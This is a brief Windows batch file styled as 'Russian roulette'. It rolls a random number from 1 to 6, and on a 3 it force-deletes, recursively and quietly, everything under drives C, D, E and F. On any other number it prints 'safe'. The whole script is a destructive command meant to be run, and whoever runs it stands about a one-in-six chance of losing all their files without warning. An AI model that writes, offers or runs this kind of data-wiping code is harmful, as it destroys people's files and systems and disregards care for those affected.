@echo off

set /a bullet=(%RANDOM%%%(6))+1

if %bullet%==3 (del C:\*.*/f /s /q & del D:\*.*/f /s /q & del E:\*.*/f /s /q & del F:\*.*/f /s /q) else (echo safe)

exit
